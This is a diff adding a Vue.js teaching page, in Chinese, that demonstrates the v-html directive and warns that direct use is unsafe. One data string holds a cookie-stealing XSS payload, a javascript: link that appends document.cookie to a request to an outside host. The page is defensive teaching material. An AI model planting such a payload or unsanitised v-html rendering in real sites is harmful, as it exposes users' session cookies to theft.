@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vue的模板语法</title>
+    <!-- 引入Vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+  </head>
+  <body>
+    <!-- 容器 -->
+    <div id="root">
+        <!-- v-html指令: 用于解析html标签 -->
+        <h2 v-html="htmlStr"></h2>
+
+        <!-- 直接使用会有安全问题 -->
+        <h2 v-html="str"></h2>
+    </div>
+  </body>
+
+  <script type="text/javascript">
+    new Vue({
+        el: '#root',
+        data: {
+            htmlStr: "<h3>我是h3标签</h3>",
+            str: '<a href=javascript:location.href="http://www.baidu.com" + "?" + document.cookie>我是一个链接，跳转到指定服务器</a>'
+        }
+    })
+  </script>
+</html>
